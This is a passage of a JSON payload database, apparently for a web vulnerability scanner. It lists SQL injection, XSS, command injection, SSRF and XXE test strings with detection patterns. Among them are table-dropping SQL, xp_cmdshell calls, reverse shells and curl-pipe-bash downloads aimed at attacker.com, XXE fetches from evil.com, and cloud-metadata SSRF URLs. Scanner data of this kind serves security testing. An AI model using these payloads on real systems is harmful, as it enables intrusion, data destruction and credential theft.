{
  "version": "2.0.0",
  "last_updated": "2026-03-09",
  "description": "增强版漏洞检测数据库 - 包含多种漏洞类型的Payloads和检测规则",
  
  "vulnerabilities": {
    "sql_injection": {
      "name": "SQL注入",
      "owasp": "A03:2021-Injection",
      "severity": "critical",
      "description": "通过用户输入执行恶意SQL语句",
      "payloads": [
        {"value": "' OR '1'='1", "type": "boolean_based"},
        {"value": "' OR '1'='1' --", "type": "boolean_based"},
        {"value": "' OR '1'='1'/*", "type": "boolean_based"},
        {"value": "1' AND '1'='1", "type": "boolean_based"},
        {"value": "1' AND '1'='1'--", "type": "boolean_based"},
        {"value": "1 UNION SELECT NULL--", "type": "union_based"},
        {"value": "1 UNION SELECT NULL,NULL--", "type": "union_based"},
        {"value": "1 UNION SELECT NULL,NULL,NULL--", "type": "union_based"},
        {"value": "'; DROP TABLE users;--", "type": "stacked_query"},
        {"value": "admin'--", "type": "auth_bypass"},
        {"value": "' UNION SELECT * FROM users--", "type": "union_based"},
        {"value": "1' ORDER BY 1--", "type": "order_by"},
        {"value": "1' ORDER BY 10--", "type": "order_by"},
        {"value": "1' AND SLEEP(5)--", "type": "blind"},
        {"value": "1'; WAITFOR DELAY '0:0:5'--", "type": "blind"},
        {"value": "1' AND (SELECT COUNT(*) FROM users)>0--", "type": "blind"},
        {"value": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "type": "error_based"},
        {"value": "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "type": "mssql"},
        {"value": "'; EXEC xp_cmdshell('whoami');--", "type": "rce"},
        {"value": "1' WAITFOR DELAY '00:00:05'--", "type": "blind"}
      ],
      "error_patterns": [
        "sql syntax", "mysql_fetch", "mysql_num_rows", "ora-", 
        "postgresql error", "sqlite3 error", "unterminated", 
        "syntax error at or near", "sqlerror", "microsoft sql",
        "odbc sql server", "sqlserver exception", "invalid sql",
        "sql injection", "warning mysql", "php mysql"
      ]
    },
    
    "xss": {
      "name": "跨站脚本攻击(XSS)",
      "owasp": "A03:2021-Injection",
      "severity": "high",
      "description": "在页面中注入恶意脚本",
      "payloads": [
        {"value": "<script>alert('XSS')</script>", "type": "basic"},
        {"value": "<img src=x onerror=alert(1)>", "type": "img_onerror"},
        {"value": "<svg/onload=alert(1)>", "type": "svg"},
        {"value": "javascript:alert(1)", "type": "javascript"},
        {"value": "<body onload=alert(1)>", "type": "body"},
        {"value": "'-alert(1)-'", "type": "string_break"},
        {"value": "<input onfocus=alert(1) autofocus>", "type": "input"},
        {"value": "<iframe src=javascript:alert(1)>", "type": "iframe"},
        {"value": "{{constructor.constructor('alert(1)')()}}", "type": "template"},
        {"value": "<script>eval(atob('YWxlcnQoMSk='))</script>", "type": "encoded"},
        {"value": "<div onmouseover=alert(1)>hover</div>", "type": "event"},
        {"value": "<marquee onstart=alert(1)>", "type": "event"},
        {"value": "<details open ontoggle=alert(1)>", "type": "html5"},
        {"value": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></table>", "type": "bypass"},
        {"value": "<scr<script>ipt>alert(1)</scr</script>ipt>", "type": "filter_bypass"},
        {"value": "<ScRiPt>alert(1)</sCrIpT>", "type": "case_bypass"},
        {"value": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onload=alert(1)//'>", "type": "comment_bypass"},
        {"value": "<img src=x onerror=alert(1)>", "type": "advanced"}
      ],
      "detection_methods": [
        {"method": "reflection", "description": "检查payload是否在响应中反射"},
        {"method": "event_handler", "description": "检查事件处理器是否被触发"},
        {"method": "javascript_execution", "description": "检查JavaScript是否执行"}
      ]
    },
    
    "command_injection": {
      "name": "命令注入",
      "owasp": "A03:2021-Injection",
      "severity": "critical",
      "description": "在服务器端执行恶意系统命令",
      "payloads": [
        {"value": "; ls -la", "type": "basic"},
        {"value": "| ls -la", "type": "pipe"},
        {"value": "`ls -la`", "type": "backtick"},
        {"value": "$(ls -la)", "type": "substitution"},
        {"value": "; cat /etc/passwd", "type": "file_read"},
        {"value": "| whoami", "type": "basic"},
        {"value": "&& whoami", "type": "and"},
        {"value": "; id", "type": "basic"},
        {"value": "| nc -e /bin/sh attacker.com 1234", "type": "reverse_shell"},
        {"value": "; wget http://attacker.com/shell.sh -O /tmp/shell.sh", "type": "download"},
        {"value": "| curl http://attacker.com/shell.sh | bash", "type": "curl_pipe"},
        {"value": "'; cat /etc/passwd #", "type": "comment"},
        {"value": "| passwd", "type": "password_change"},
        {"value": "; gcc -o shell shell.c 2>&1", "type": "compile"},
        {"value": "| bash -i >& /dev/tcp/attacker.com/port 0>&1", "type": "reverse_shell"},
        {"value": "0wn3d", "type": "backdoor"}
      ],
      "response_indicators": [
        {"pattern": "root:", "description": "passwd文件泄露"},
        {"pattern": "bin/bash", "description": "shell信息"},
        {"pattern": "uid=", "description": "用户ID泄露"},
        {"pattern": "groups=", "description": "组信息泄露"},
        {"pattern": "/bin/sh", "description": "shell路径"},
        {"pattern": "bash:", "description": "bash版本"}
      ]
    },
    
    "ssrf": {
      "name": "服务端请求伪造",
      "owasp": "A10:2021-SSRF",
      "severity": "high",
      "description": "服务器被诱导向内部系统发起请求",
      "payloads": [
        {"value": "http://localhost/", "type": "localhost"},
        {"value": "http://127.0.0.1/", "type": "localhost"},
        {"value": "http://metadata.google/", "type": "cloud_metadata"},
        {"value": "http://169.254.169.254/", "type": "cloud_metadata"},
        {"value": "http://[::1]/", "type": "ipv6"},
        {"value": "http://0.0.0.0/", "type": "ipv4"},
        {"value": "http://2130706433/", "type": "decimal_ip"},
        {"value": "http://0177.0.0.1/", "type": "octal_ip"},
        {"value": "http://0x7f000001/", "type": "hex_ip"},
        {"value": "http://metadata.google.internal/", "type": "gcp"},
        {"value": "http://169.254.169.254/metadata/v1/", "type": "aws"},
        {"value": "http://metadata.google/computeMetadata/v1/", "type": "gcp"},
        {"value": "file:///etc/passwd", "type": "file_protocol"},
        {"value": "gopher://127.0.0.1:6379/_INFO", "type": "gopher"}
      ],
      "detection_indicators": [
        "localhost", "127.0.0.1", "0.0.0.0", "metadata", 
        "169.254", "internal", "private", "local"
      ]
    },
    
    "xxe": {
      "name": "XML外部实体注入",
      "owasp": "A03:2021-Injection",
      "severity": "high",
      "description": "解析XML时加载恶意外部实体",
      "payloads": [
        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "type": "file_read"},
        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">]><foo>&xxe;</foo>", "type": "ssrf"},
        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>", "type": "windows"},
        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://whoami\">]><foo>&xxe;</foo>", "type": "command"},
        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;]>", "type": "external_dtd"}
      ],
      "error_patterns": [
        "xml", "entity", "dtd", "doctype", "xxe", "external",
        "xmlparsedom", "documentbuilder"
      ]
    },
    
